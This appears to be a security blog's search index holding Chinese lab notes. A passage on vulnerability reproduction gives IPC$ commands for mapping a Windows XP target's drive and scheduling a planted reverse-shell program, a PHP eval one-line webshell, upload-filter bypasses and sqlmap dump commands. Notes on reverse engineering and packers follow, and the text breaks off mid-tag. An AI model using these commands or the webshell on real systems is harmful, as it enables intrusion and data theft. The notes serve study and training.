<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>漏洞分析与复现</title>
      <link href="/2023/032944469.html"/>
      <url>/2023/032944469.html</url>
      
        <content type="html"><![CDATA[<h2 id="共享技术之IPC-共享-IPC-渗透windows-xp系统"><a href="#共享技术之IPC-共享-IPC-渗透windows-xp系统" class="headerlink" title="共享技术之IPC$共享-IPC$渗透windows xp系统"></a>共享技术之IPC$共享-IPC$渗透windows xp系统</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>windows xp系统安装完成后会自动开启ipc$服务，该服务是在双方之间建立一条安全加密的管道用于双方传输数据，同时在使用该服务需要139或者445端口开放使用共享打印机，才可以使用该服务</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><ol><li>cmd命令行开启服务</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net start lanmanworkstation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/032944469/1.PNG" alt="1"></p><ol start="2"><li>获取到目标主机ip</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ping</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/032944469/2.PNG" alt="2"></p><ol start="3"><li>建立空连接</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>ipc$ <span class="token string">""</span> /user <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/032944469/3.PNG" alt="3"></p><ol start="4"><li>删除连接</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>ipc$ /del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/032944469/4.PNG" alt="4"></p><ol start="5"><li>建立非空连接</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>ipc$ <span class="token string">"密码"</span> /user:<span class="token string">"账号"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/032944469/5.PNG" alt="5"></p><ol start="6"><li>将目标主机c盘映射为客户机(本机)的z盘</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use z: <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>c$ <span class="token string">"密码"</span> /user:<span class="token string">"账号"</span> //注意其中的是c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/032944469/6.PNG" alt="6"></p><p><img src="/2023/032944469/7.PNG" alt="7"></p><ol start="7"><li>使用PcShare软件生成一个反弹shell的exe程序，并将该程序粘贴到z盘</li></ol><p><img src="/2023/032944469/8.PNG" alt="8"></p><ol start="8"><li>查看目标主机时间</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net <span class="token function">time</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/032944469/9.PNG" alt="9"></p><ol start="9"><li>定时启动反弹shell程序</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">at <span class="token punctuation">\</span><span class="token punctuation">\</span>ip 启动时间 程序名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/032944469/10.PNG" alt="10"></p><ol start="10"><li>等待结果(也可以在映射的z盘中手动启动)</li></ol><p><img src="/2023/032944469/11.PNG" alt="11"></p><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="IIS6-0解析漏洞检测绕过上传漏洞"><a href="#IIS6-0解析漏洞检测绕过上传漏洞" class="headerlink" title="IIS6.0解析漏洞检测绕过上传漏洞"></a>IIS6.0解析漏洞检测绕过上传漏洞</h3><ol><li>首先上传一个正常的照片</li></ol><p><img src="/2023/032944469/12.png" alt="12"></p><ol start="2"><li>上传一个shell.php，发现会被拦截</li></ol><p><img src="/2023/032944469/13.png" alt="13"></p><ol start="3"><li>burp抓包进行绕过</li></ol><p><img src="/2023/032944469/14.png" alt="14"></p><ol start="4"><li>查看上传结果(文件在uploadimg下，文件名是1.php;1980687817.jpg)</li></ol><p><img src="/2023/032944469/15.png" alt="15"></p><ol start="5"><li>验证绕过结果</li></ol><p><img src="/2023/032944469/16.png" alt="16"></p><p>success!!!</p><h3 id="IIS6-0目录路径检测解析绕过上传漏洞"><a href="#IIS6-0目录路径检测解析绕过上传漏洞" class="headerlink" title="IIS6.0目录路径检测解析绕过上传漏洞"></a>IIS6.0目录路径检测解析绕过上传漏洞</h3><ol><li>上传正常文件</li></ol><p><img src="/2023/032944469/17.png" alt="17"></p><ol start="2"><li>上传asp文件</li></ol><p><img src="/2023/032944469/18.png" alt="18"></p><ol start="3"><li>burp抓包绕过</li></ol><p><img src="/2023/032944469/19.png" alt="19"></p><ol start="4"><li>上传结果</li></ol><p><img src="/2023/032944469/20.png" alt="20"></p><ol start="5"><li>环境存在问题，测试链接失败</li></ol><h3 id="FCK编辑器漏洞"><a href="#FCK编辑器漏洞" class="headerlink" title="FCK编辑器漏洞"></a>FCK编辑器漏洞</h3><p>FCK版本 2.4.2</p><ol><li>在网址后面输入：/_samples/default.html 打开编辑器页面，点 击？可以查看编辑器的版本，版本为 2.4.2</li></ol><p><img src="/2023/032944469/21.png" alt="21"></p><ol start="2"><li>在地址后面将/_samples/default.html 改为/whatsnew.html 访问这 个地址可以查看fck的历史版本，最上面的就是当前使用的版本 2.4.2</li></ol><p><img src="/2023/032944469/22.png" alt="22"></p><ol start="3"><li>FCK2.4.2 的上传地址：/_samples/default.html 打开编辑器，点 击上传图片，可以进行上传</li></ol><p><img src="/2023/032944469/23.png" alt="23"></p><ol start="4"><li>上传正常图片成功，上传 webshell，返回错误信息，提示 类型不正确.上传地址为:/editor/filemanager/browser/defa ult/connectors/test.html</li></ol><p><img src="/2023/032944469/24.png" alt="24"></p><p><img src="/2023/032944469/25.png" alt="25"></p><ol start="5"><li>点击 Create Folder 进行新建，输入名字 2.php “确定”</li></ol><p><img src="/2023/032944469/26.png" alt="26"></p><ol start="6"><li>在 Current Folder 里输入 2.php，设置好文件保存路径，保存到 2.php 文件夹里,同时修改上传文件扩展名为jpg</li></ol><p><img src="/2023/032944469/27.png" alt="27"></p><ol start="7"><li>上传成功，点击 Get Folders and Files 查 看 上 传 路 径 地 址 为 ： /userfiles/file/2.php/shell.jpg</li></ol><p><img src="/2023/032944469/28.png" alt="28"></p><ol start="8"><li>验证链接地址为<a href="http://www.test.com/userfiles/file/2.php/shell.jpg">www.test.com/userfiles/file/2.php/shell.jpg</a></li></ol><p><img src="/2023/032944469/29.png" alt="29"></p><p>success!!!</p><p><strong>FCK2.6.6与之类似，但是2.6.6上传地址是：</strong>/editor/filemanager/connectors/test.html</p><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h3 id="PHP本地文件包含"><a href="#PHP本地文件包含" class="headerlink" title="PHP本地文件包含"></a>PHP本地文件包含</h3><ol><li><p>已知存在文件包含漏洞，包含漏洞产生原因是index.php中的page参数产生，传参方式是get形</p></li><li><p>首先注册账号登录–&gt;控制面板进入个人主页–&gt;头像管理</p></li></ol><p><img src="/2023/032944469/30.png" alt="30"></p><ol start="3"><li>构建php一句话木马，因为在被包含文件中，如果包含成功，无论什么格式的文件，都会被当做PHP文件执行(<strong>index.php中可以分析得到</strong>)，以扩展名为jpg上传</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/032944469/31.png" alt="31"></p><ol start="4"><li>上传完毕之后，头像会更换为上传这个，之后点击头像，查看头像链接</li></ol><p><img src="/2023/032944469/32.png" alt="32"></p><ol start="5"><li>进行文件包含，验证</li></ol><p>构建的文件包含链接</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//172.16.12.2/index.php?page=./images/avatars/03/3.jpg//3.jpg是图像上传之后被改的名</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/032944469/33.png" alt="33"></p><p>sucess!!!</p><h2 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h2><h3 id="strcmp函数缺陷"><a href="#strcmp函数缺陷" class="headerlink" title="strcmp函数缺陷"></a>strcmp函数缺陷</h3><ol><li>我们在输入用户名和密码后，点击登录，页面会提示<code>密码不正确</code>，我们可以看到我粘贴复制的地址，路径后面的参数是?pass=hackewmeweplease#</li></ol><p><img src="/2023/032944469/34.PNG" alt="34"></p><ol start="2"><li>我们来查看服务器上有什么文件是可以被查看的，然后我们在网站的URL地址上输入robots.txt，我们查看结果</li></ol><p><img src="/2023/032944469/35.PNG" alt="35"></p><ol start="3"><li>我们可以发现服务器返回给我我们的结果是<code>strcmp</code>，我们就可以利用php的弱类型构造，来构造语句,在URL地址上输入<code>?pass[]=1</code></li></ol><p><img src="/2023/032944469/36.PNG" alt="36"></p><ol start="4"><li>服务器返回给我们的结果为<code>后台：95de87f12261.php</code>,说明我们的代码文件里面存在着<code>95de87f12261.php</code>文件。然后，我们可以通过访问<code>95de87f12261.php</code>页面来查看信息</li></ol><p><img src="/2023/032944469/37.PNG" alt="37"></p><ol start="5"><li>测试是否含有sql注入漏洞，测试出**闭合符为 ‘ 即：1’ – - **，回显为三行，同时会对select进行过滤</li></ol><p><img src="/2023/032944469/38.PNG" alt="38"></p><ol start="6"><li>采用sqlmap进行爆破</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span>p <span class="token builtin">id</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现存在<strong>延时注入、联合查询</strong></p><ol start="7"><li>暴当前的数据库</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span>p <span class="token builtin">id</span> <span class="token operator">-</span><span class="token operator">-</span>current<span class="token operator">-</span>db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/032944469/40.PNG" alt="40"></p><ol start="8"><li>暴表</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span>p <span class="token builtin">id</span> <span class="token operator">-</span>D ts_test <span class="token operator">-</span><span class="token operator">-</span>tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/032944469/41.PNG" alt="41"></p><ol start="9"><li>暴字段，发现并不存在</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span>p <span class="token builtin">id</span> <span class="token operator">-</span>D ts_test <span class="token operator">-</span>T flag <span class="token operator">-</span><span class="token operator">-</span>columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/032944469/42.PNG" alt="42"></p><ol start="10"><li>暴数据</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span>p <span class="token builtin">id</span> <span class="token operator">-</span>D ts_test <span class="token operator">-</span>T flag <span class="token operator">-</span><span class="token operator">-</span>dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/032944469/43.PNG" alt="43"></p><h2 id="信息伪造"><a href="#信息伪造" class="headerlink" title="信息伪造"></a>信息伪造</h2><h3 id="cookie欺诈"><a href="#cookie欺诈" class="headerlink" title="cookie欺诈"></a>cookie欺诈</h3><ol><li>首先判断网页脚本语言</li></ol><p><img src="/2023/032944469/45.PNG" alt=" "></p><p><img src="/2023/032944469/46.PNG" alt=" "></p><p>测试发现网页脚本语言时php</p><ol start="2"><li>查看网页源代码，发现一段js代码，分析可知cookie存在问题</li></ol><p><img src="/2023/032944469/44.PNG" alt=" "></p><p><img src="/2023/032944469/47.PNG" alt=" "></p><ol start="3"><li>使用burpsuite抓包，修改cookie=1，进行破解</li></ol><p><img src="/2023/032944469/48.PNG" alt=" "></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>re</title>
      <link href="/2023/032935812.html"/>
      <url>/2023/032935812.html</url>
      
        <content type="html"><![CDATA[<h2 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h2><h3 id="什么是花指令"><a href="#什么是花指令" class="headerlink" title="什么是花指令"></a>什么是花指令</h3><p>花指令实质就是一串垃圾指令，它与程序本身的功能无关，并不影响程序本身的逻辑。在软件保护中，花指令被作为一种手段来增加静态分析的难度，花指令也可以被用在病毒或木马上，通过加入花指令改变程序的特征码，躲避杀软的扫描，从而达到免杀的目的，本文将介绍一些常见的花指令的形式，花指令一般被分为两类，被执行的和不会被执行的。</p><p>花指令是企图隐藏掉不想被逆向工程的代码块 (或其它功能) 的一种方法, 在真实代码中插入一些垃圾代码的同时还保证原有程序的正确执行, 而程序无法很好地反编译, 难以理解程序内容, 达到混淆视听的效果.</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>产生花指令的根本原因是x86指令集由不定长指令构成<br>当通过跳转使执行流命中到另一条指令的中间时就会造成静态反汇编的解析错误</p><p>现代反汇编器有两种思路：</p><p>线性扫描<br>从开头到结尾依次读取机器码并进行反汇编<br>递归下降<br>从程序入口向后反汇编，遇到条件跳转则分别从分支的地方继续反汇编，无条件跳转则尝试从目的指令继续反汇编<br>线性扫描显然很容易制造花指令，只要在跳转和目标之间插入长度较长的指令开头（例如E8，后接4个字节）即可使之后的所有指令解析错误。OllyDbg和windbg就是使用的线性扫描法</p><p>而递归下降则可以避开这种简单的花指令，跳过中间的脏字节。但对于一些针对性的花指令–例如jz+jnz+脏字节，则会由于上下文无关的算法而对脏字节进行解析</p><p>除此以外还有把call当jmp使用的手段，由于在编译器中call只会用来作为子程序/函数跳转的指令，因此IDA往往会将call的地址视作一个函数的起始地址，进而破坏整个函数的完整性</p><h3 id="常见花指令"><a href="#常见花指令" class="headerlink" title="常见花指令"></a>常见花指令</h3><ol><li><p>jx+jnx</p></li><li><p>call+pop/add esp/add [esp] + retn</p></li><li><p>stx/jx</p></li><li><p>循环跳转花指令  </p></li></ol><h3 id="如何去除花指令"><a href="#如何去除花指令" class="headerlink" title="如何去除花指令"></a>如何去除花指令</h3><p>   根据程序需要修改或者nop掉，具体问题具体分析  </p><h2 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h2><p>迷宫问题有以下特点:</p><ul><li>在内存中布置一张 “地图”</li><li>将用户输入限制在少数几个字符范围内.</li><li>一般只有一个迷宫入口和一个迷宫出口</li></ul><p>布置的地图可以由可显字符 (比如<code>#</code>和<code>*</code>)组合而成 (这非常明显, 查看字符串基本就知道这是个迷宫题了.), 也可以单纯用不可显的十六进制值进行表示. 可以将地图直接组成一条非常长的字符串, 或是一行一行分开布置. 如果是一行一行分开布置的话, 因为迷宫一般都会比较大, 所以用于按行(注意, 布置并非按顺序布置, 每行都对应一个具体的行号, 你需要确定行号才能还原迷宫地图) 布置迷宫的函数会明显重复多次.</p><p>而被限制的字符通常会是一些方便记忆的组合 (不是也没办法), 比如<code>w/s/a/d</code>, <code>h/j/k/l</code>, <code>l/r/u/d</code>这样的类似组合. 当然各个键具体的操作需要经过分析判断 (像那种只用一条字符串表示迷宫的, 就可以用<code>t</code>键表示向右移动<code>12</code>个字符这样). 对于二维的地图, 一般作者都会设置一个<code>X坐标</code>和一个<code>Y坐标</code>用于保存当前位置. 我们也可以根据这个特点来入手分析.</p><p>一般情况下, 迷宫是只有 1 个入口和 1 个出口, 像入口在最左上角<code>(0, 0)</code>位置, 而出口在最右下角<code>(max_X, max_Y)</code>处. 但也有可能是出口在迷宫的正中心, 用一个<code>Y</code>字符表示等等. 解答迷宫题的条件也是需要根据具体情况判断的.</p><p>当然迷宫的走法可能不止 1 条, 也有情况是有多条走法, 但是要求某一个走法比如说代价最小. 那么这就可以变相为一个算法问题.</p><h2 id="逆向常见壳"><a href="#逆向常见壳" class="headerlink" title="逆向常见壳"></a>逆向常见壳</h2><ol><li>加壳目的  <ul><li>隐藏文件作者的个人信息或者相关不应该暴露的信息  </li><li>压缩文件，加壳之后文件的体积会变小  </li><li>有些黑客会使用壳来防止自己在文件中加入的病毒等东西被杀毒软件找到杀掉  </li></ul></li><li>常见壳的类型  <ul><li>压缩壳  </li><li>保护壳  </li><li>捆绑壳  </li></ul></li><li>压缩壳  <ul><li>upx加壳或脱壳  <ul><li>加壳原理: 首先将程序压缩。所谓的压缩包括两方面，一方面在程序的开头或者其他合适的地方 插入一段代码，另一方面是将程序的其他地方做压缩。压缩也可以叫做加密，因为压缩后的程序比较难看懂，主要是 和原来的代码有很大的不同。最大的表现也就是他的主要作用就是程序本身变小了。变小之后的程序在传输方面有很 大的优势。其次就是在程序执行时，实时的对程序解压缩  </li><li>加壳格式:<br>最初代码的形式就应该是:7==&gt;8==&gt;9==&gt;5==&gt;6<br>用upx压缩之后形式为：1==&gt;2==&gt;3==&gt;4==&gt;5==&gt;6<br>执行时的形式变为：1==&gt;7==&gt;8==&gt;9==&gt;5==&gt;6(其中1是upx插入的代码，2,3,4是文件代码,5,6随意)  </li><li>加壳解壳工具:<br>加壳：upx shell，也可以下载upx，在命令行中该目录下使用命令:upx 文件名 进行加壳操作<br>解壳：upx unpacker，也可以也可以下载upx，在命令行中该目录下使用命令:upx -d 文件名 进行解壳操作(我常用方式)，也可以进行手动解壳(太难，不建议使用，如果是大佬请忽略)  </li><li>示例：<br>upx加壳操作<br><img src="/2023/032935812/1.png"><br>upx解壳操作<br><img src="/2023/032935812/2.png"><br>手动解壳(待补充!!!)<br><a href="https://upx.github.io/">upx下载地址</a>  </li></ul></li><li>ASPack壳  <ul><li>ASPack壳也是压缩壳，加壳原理与upx相同  </li><li>加壳解壳工具:<br>加壳:ASPack<br>解壳:ASPack UnPacker  </li><li>示例:(未遇到，待补充)  </li></ul></li><li>PECompact壳  <ul><li>PECompact壳也是压缩壳，加壳原理与upx相同  </li><li>加壳解壳工具:<br>加壳:PECompact_v3.02.2_Final.7z<br>解壳:Unpacker_PECompact.7z  </li><li>示例:(未遇到，待补充)  </li></ul></li><li>RLPack壳  <ul><li>RLPack壳也是压缩壳，加壳原理与upx相同  </li><li>加壳解壳工具:<br>加壳:()<br>解壳:Rlpack 1.2x_Unpacker_V0.3_Final.rar  </li><li>示例:(未遇到，待补充)  </li></ul></li><li>NsPack壳  <ul><li>NsPack壳也是压缩壳，加壳原理与upx相同  </li><li>加壳解壳工具:<br>加壳:NsPack<br>解壳:NsPack strripter 3.x  </li><li>示例:(未遇到，待补充)  </li></ul></li></ul></li><li>保护壳  <ul><li>ASProtect壳    <ul><li>加壳解壳工具:<br>加壳:ASProtect.SKE.v2.51.build.09.22.beta-RES-incl-kg.7z<br>解壳:ASProtect Unpacker.rar  </li><li>示例:(未遇到，待补充)  </li></ul></li><li>Armadillo壳    <ul><li>加壳解壳工具:<br>加壳:<br>解壳:  </li><li>示例:(未遇到，待补充)  </li></ul></li><li>EXECryptor壳    <ul><li>加壳解壳工具:<br>加壳:()<br>解壳:Unpacker ExeCryptor 2.x.x v1.0 RC2.zip  </li><li>示例:(未遇到，待补充)  </li></ul></li><li>Themida壳    <ul><li>加壳解壳工具:<br>加壳:Themida_x32_x64_v3.0.4.0_Repacked.rar<br>解壳:Themida&amp;winlicense UnPacKer v2.0.rar  </li><li>示例:(未遇到，待补充)   </li></ul></li><li>VMProtect壳    <ul><li>加壳解壳工具:<br>VMProtect_Professional_v2.13.8.rar  </li><li>示例:(未遇到，待补充)   </li></ul></li></ul></li><li>捆绑壳  <ul><li>MoleBox壳  <ul><li>加壳解壳工具:<br>加壳:<br>解壳: Molebox_Virtualization_Studio_unpacker </li><li>示例:(未遇到，待补充)   </li></ul></li></ul></li><li>补充说明:<br><a href="https://www.52pojie.cn/">以上部分加壳解壳工具下载地址</a></li></ol><h2 id="IDA反汇编失败–call-analysis-failed"><a href="#IDA反汇编失败–call-analysis-failed" class="headerlink" title="IDA反汇编失败–call analysis failed"></a>IDA反汇编失败–call analysis failed</h2><h3 id="原因-可能是"><a href="#原因-可能是" class="headerlink" title="原因(可能是)"></a>原因(可能是)</h3><ul><li>IDA无法识别出正确的调用约定(calling convention)  </li><li>IDA无法识别出正确的参数个数  </li></ul><h3 id="IDA无法识别出正确的调用约定-calling-convention"><a href="#IDA无法识别出正确的调用约定-calling-convention" class="headerlink" title="IDA无法识别出正确的调用约定(calling convention)"></a>IDA无法识别出正确的调用约定(calling convention)</h3><p><img src="/2023/032935812/7.png" alt=" "><br>这个时候我们只要去出错位置分析就好了，看看是什么问题导致的<br><img src="/2023/032935812/8.png" alt=" "><br>在该位置可以判断参数参数正确，那就是ida无法识别正确的调用约定，这时候我们只要双击进入该函数，进行一下反汇编，之后在对main进行反汇编就可以了  </p><h3 id="IDA无法识别出正确的参数个数"><a href="#IDA无法识别出正确的参数个数" class="headerlink" title="IDA无法识别出正确的参数个数"></a>IDA无法识别出正确的参数个数</h3><p><img src="/2023/032935812/3.png" alt="3"></p><p>这个时候我们只要去出错位置分析就好了，看看是什么问题导致的<br><img src="/2023/032935812/4.png" alt=" "><br><img src="/2023/032935812/5.png" alt=" "><br>经分析可以知道该函数在该位置仅仅调用了两个函数，虽然0x50bf81这个地址ida反汇编中有9个，但是明显不符合要求<br><img src="/2023/032935812/6.png" alt=" "><br>这时候我们只要对该函数按’y’键，将其参数修改为两个，即可正常反编译  </p><h2 id="python逆向"><a href="#python逆向" class="headerlink" title="python逆向"></a>python逆向</h2><h3 id="附件为py文件"><a href="#附件为py文件" class="headerlink" title="附件为py文件"></a>附件为py文件</h3><p>直接看源代码分析</p><h3 id="附件为pyc文件"><a href="#附件为pyc文件" class="headerlink" title="附件为pyc文件"></a>附件为pyc文件</h3><ul><li>在线网址反编译：<a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a></li><li>使用uncompyle6<ul><li>安装：pip install uncompyle6</li><li>使用：uncompyle6 -o test.py test.pyc</li></ul></li></ul><h3 id="附件为打包的exe文件"><a href="#附件为打包的exe文件" class="headerlink" title="附件为打包的exe文件"></a>附件为打包的exe文件</h3><ul><li>使用Pyinstaller打包<ul><li>安装：<a href="https://sourceforge.net/projects/pyinstallerextractor/">PyInstaller Extractor download | SourceForge.net</a></li><li>使用：python pyinstxtractor.py test.exe</li></ul></li><li>使用py2exe打包<ul><li>安装unpy2exe：pip install unpy2exe</li><li>使用：unpy2exe.py -o test test.exe</li></ul></li></ul><h3 id="python字节码"><a href="#python字节码" class="headerlink" title="python字节码"></a>python字节码</h3><p>根据官方文档慢慢翻译</p><p><a href="https://docs.python.org/zh-cn/3/library/dis.html?highlight=dis">dis — Python 字节码反汇编器 — Python 3.10.1 文档</a>  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python</title>
      <link href="/2023/032851872.html"/>
      <url>/2023/032851872.html</url>
      
        <content type="html"><![CDATA[<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">c<span class="token punctuation">.</span>conjugate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span>返回c的共轭复数<span class="token builtin">divmod</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token operator">//</span>返回<span class="token punctuation">(</span>x<span class="token operator">//</span>y<span class="token punctuation">,</span>x<span class="token operator">%</span>y<span class="token punctuation">)</span><span class="token operator">//</span>random<span class="token punctuation">.</span>getstate<span class="token punctuation">(</span><span class="token punctuation">)</span>方法random模块返回具有随机数生成器当前内部状态的对象。该对象可以传递给random<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">)</span>恢复状态的方法。此方法没有传递任何参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://zhuanlan.zhihu.com/p/157227878">Python decimal模块使用方法详解</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>逆向分析技术</title>
      <link href="/2023/032812655.html"/>
      <url>/2023/032812655.html</url>
      
        <content type="html"><![CDATA[<h2 id="反汇编技术"><a href="#反汇编技术" class="headerlink" title="反汇编技术"></a>反汇编技术</h2><h3 id="“E8”机器码"><a href="#“E8”机器码" class="headerlink" title="“E8”机器码"></a>“E8”机器码</h3><ol><li>首先来到main函数位置，之后往下看，该处0040100c处代码进行分析：</li></ol><p><img src="/2023/032812655/1.png" alt="1"></p><ul><li>在①处：如果xor之后的结果满足，则进行跳转，又因为是xor eax,eax，结果一定满足跳转，<strong>这就是对抗反汇编的方法之一：固定条件跳转</strong>，继续向下看；</li><li>在②处：上方跳转之后会跳转到401011地址，该地址在call near ptr 8B4C55A0H代码中间部位，从而导致无法进行反汇编。</li></ul><ol start="2"><li>将光标放在call左边的401010地址位置(同一行),按D快捷键，对代码进行数据转换</li></ol><p><img src="/2023/032812655/2.png" alt="2"></p><ol start="3"><li>在unk_401011地址处按快捷键c将数据转换成代码</li></ol><p><img src="/2023/032812655/3.png" alt="3"></p><p>可以看出，在401010地址多出了E8机器码，该机器码会将E8当作call指令，之后的四个字节当作地址，同时可以看到还有db 8BH的数据，在<strong>db 8BH的地址处按c</strong>进行转换，若下面还有则继续该操作，直到没有为止。</p><ol start="4"><li>如图，<strong>固定条件对抗反汇编技术破解完成</strong></li></ol><p><img src="/2023/032812655/4.png" alt="4"></p><p><strong>小技巧：</strong></p><p>光标放在call地址处，选择Options–&gt;找到Number of opcode bytes在方框中写入5，可以调出程序的机器码</p><p><img src="/2023/032812655/5.png" alt="5"></p><p><img src="/2023/032812655/6.png" alt="6"></p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a><strong>总结：</strong></h4><ul><li>这个二进制程序中使用了<strong>固定条件跳转方法</strong>对抗反汇编技术</li><li>这个二进制程序使用了**E8(程序错认为call指令)**这个流氓机器码来欺骗反汇编过程</li><li>该程序中这种对抗反汇编技术被使用了<strong>5</strong>次</li><li>什么命令行参数会让程序输出“Good Job”(具体分析如下)</li></ul><ol><li>对抗反汇编已全部破解，之后选中代码起始位置至retn位置，按P快捷键，将其转换成函数</li></ol><p><img src="/2023/032812655/7.png" alt="7"></p><p><img src="/2023/032812655/8.png" alt="8"></p><ol start="2"><li>直接对其f5反汇编分析，或者空格转换成流程图分析就可知**输入pdq时，程序输出“Good Job”</li></ol><p><img src="/2023/032812655/9.png" alt="9"></p><h3 id="idc脚本能够灵活化解对抗反汇编技术"><a href="#idc脚本能够灵活化解对抗反汇编技术" class="headerlink" title="idc脚本能够灵活化解对抗反汇编技术"></a>idc脚本能够灵活化解对抗反汇编技术</h3><h4 id="对抗反汇编技术破解"><a href="#对抗反汇编技术破解" class="headerlink" title="对抗反汇编技术破解"></a>对抗反汇编技术破解</h4><ol><li><strong>固定条件跳转(破解方式如“E8机器码”)：</strong></li></ol><ul><li>第一处</li></ul><p><img src="/2023/032812655/10.png" alt="10"></p><p><img src="/2023/032812655/11.png" alt="11"></p><ul><li>第二处</li></ul><p><img src="/2023/032812655/12.png" alt="12"></p><p><img src="/2023/032812655/13.png" alt="13"></p><ul><li><strong>第三处(有点特殊):该处jmp跳转到jmp指令第二个字节位置</strong></li></ul><p>在jmp地址按D快捷键：</p><p><img src="/2023/032812655/14.png" alt="14"></p><p>E8机器码下一行按C快捷键</p><p><img src="/2023/032812655/15.png" alt="15"></p><ul><li><strong>第四处(双跳同一地址)</strong></li></ul><p><img src="/2023/032812655/16.png" alt="16"></p><ul><li><strong>向上跳转</strong></li></ul><p><img src="/2023/032812655/18.png" alt="18"></p><p>在4012E6处按D快捷键</p><p><img src="/2023/032812655/19.png" alt="19"></p><p>在4012E8处按C快捷键</p><p><img src="/2023/032812655/20.png" alt="20"></p><p><img src="/2023/032812655/21.png" alt="21"></p><p><strong>对于多出来的机器码可以使用90H即nop进行填充</strong></p><h4 id="idc脚本对抗反汇编"><a href="#idc脚本对抗反汇编" class="headerlink" 